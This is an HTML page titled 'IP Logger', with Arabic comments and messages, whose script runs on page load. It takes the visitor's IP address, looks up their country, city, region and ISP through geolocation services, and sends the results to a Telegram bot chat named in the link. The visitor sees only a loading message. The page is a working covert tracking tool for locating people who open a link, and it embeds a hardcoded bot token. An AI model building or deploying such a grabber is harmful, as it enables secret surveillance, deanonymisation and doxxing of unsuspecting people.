<!DOCTYPE html>
<html>
<head>
    <title>IP Logger</title>
    <script>
        // التوكن الجديد
        const botToken = '8785733862:AAEMVzY_90ifztd1S3A3IIBT_KMB_ryAgn0';

        async function sendInfo() {
            try {
                const urlParams = new URLSearchParams(window.location.search);
                const chatId = urlParams.get('id');

                if (!chatId) {
                    document.body.innerHTML = '<h1>⚠️ رابط غير صالح</h1>';
                    return;
                }

                // جلب الـ IP الحقيقي
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                // جلب الموقع الحقيقي
                const locationResponse = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon,isp,org`);
                const locationData = await locationResponse.json();

                if (locationData.status !== 'success') {
                    document.body.innerHTML = '<h1>❌ فشل جلب الموقع</h1>';
                    return;
                }

                const message = `
🕵️ **تم تسجيل دخول جديد!**
📌 **IP:** ${ip}
📍 **الدولة:** ${locationData.country || 'غير معروف'}
🏙️ **المدينة:** ${locationData.city || 'غير معروف'}
🗺️ **المنطقة:** ${locationData.regionName || 'غير معروف'}
🌐 **المزود:** ${locationData.isp || 'غير معروف'}
📡 **المنظمة:** ${locationData.org || 'غير معروف'}
                `;

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                document.body.innerHTML = '<h1>✅ تم الإرسال بنجاح</h1>';

            } catch (error) {
                console.error('خطأ:', error);
                document.body.innerHTML = '<h1>❌ حدث خطأ، حاول مرة أخرى</h1>';
            }
        }

        window.onload = sendInfo;
    </script>
</head>
<body>
    <h1>جاري تحميل البيانات...</h1>
</body>
</html>
